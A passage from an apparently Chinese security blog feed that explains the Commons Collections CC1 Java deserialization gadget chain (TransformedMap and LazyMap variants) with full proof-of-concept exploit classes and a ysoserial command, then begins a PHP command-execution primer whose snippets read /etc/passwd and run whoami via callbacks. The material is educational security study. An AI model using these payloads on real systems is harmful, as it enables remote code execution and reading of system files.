NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invoke</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="comment">//TransformedMap.decorate(map,null,invoke);</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap =TransformedMap.decorate(map,<span class="literal">null</span>,invoke);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后查看谁的里面调用了setValue</p>
<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法调用了<code>setValue()</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这个类不是public 所以可以通过反射来来获取，</p>
<p>再看看这个类的构造方法。参数是一个<code>Class</code>对象，一个<code>Map</code>对象，其中<code>Class</code>继承了<code>Annotation</code>，也就是需要传入一个注解类进去（Target或者Override）。</p>
<p>注解举个例子就是我们经常会见到的<code>@Override</code>。override.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line">annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure>

<p>再看readObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="poc如下"><a href="#poc如下" class="headerlink" title="poc如下"></a>poc如下</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cons.newInstance(Retention.class, transformMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filname)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filname);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>



<h2 id="LazyMap链子"><a href="#LazyMap链子" class="headerlink" title="LazyMap链子"></a>LazyMap链子</h2><p>寻找的 transform 入口中，找到 <strong>LazyMap</strong> 中的get方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected final Transformer factory;</span><br></pre></td></tr></table></figure>

<p><strong>factory可控</strong>，这样可以变为ChainedTransformer，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们接下来只需要找到一个readObject方法调用了该get方法即可</p>
<p><strong>AnnotationInvocationHandler</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>AnnotationInvocationHandler</strong>其实在该类中的readObject方法中并没有找到能有直接引用map的get方法的,但是有一个invoke中可以执行get方法,这就需要引入一点点java代理的知识</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">       <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">           paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">           <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">       <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">           <span class="keyword">return</span> toStringImpl();</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">           <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">           <span class="keyword">return</span> type;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">       <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  <span class="comment">//这里调用</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">           <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">           result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>

<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);  <span class="comment">//一旦调用get方法，就实现rce</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(Retention.class, lazymap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxymap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cons.newInstance(Retention.class,proxymap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filname)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filname);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="https://s3.bmp.ovh/imgs/2024/02/19/9093cc14105fb07b.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&vd_source=eeef3f04dd031c42db0f3b02d8f0ff4b">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p>
<p><a href="https://xz.aliyun.com/t/9873#toc-13">CC链学习-上 - 先知社区 (aliyun.com)</a></p>
<p><a href="http://www.yongsheng.site/2022/01/24/CommonsCollections-1(%E4%B8%8A)/">CommonsCollections-1(上) | Y0ng的博客 (yongsheng.site)</a></p>
<p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介 | 闪烁之狐 (blinkfox.github.io)</a></p>
<p><a href="http://www.yongsheng.site/2022/01/24/CommonsCollections-1(%E4%B8%8A)/">JAVA安全|Gadget篇：TransformedMap CC1链 (qq.com)</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>php命令执行</title>
    <url>/2024/02/25/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>php 基础</p>
<span id="more"></span>

<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>system()exec()shell_exec()passthru()pcntl_exec()popen()proc_open()</p>
<p>用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pcntl_exec(&quot;/bin/cat&quot;,array(&quot;/etc/passwd));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=popen(&quot;bin/cat,/etc/passwd&quot;,&quot;r&quot;);$b=fread($a,2096);echo $b;pclose($a);</span><br></pre></td></tr></table></figure>

<p>ob_start() 是 PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 ob_end_flush() 来发送缓冲区内容至浏览器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start(&quot;system&quot;);</span><br><span class="line">echo &quot;whoami&quot;;</span><br><span class="line">ob_end_flush();?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>遍历 <code>array</code> 数组中的每个值，并将每个值传递给 <code>callback</code> 回调函数。 如果 <code>callback</code> 回调函数返回 **<code>true</code>**，则将 <code>array</code> 数组中的当前值返回到结果 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a> 数组中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_filter(array $array,  $callback )</span><br><span class="line">array   要遍历的数组</span><br><span class="line">callback  使用的回调函数</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>回调函数的一些使用</p>
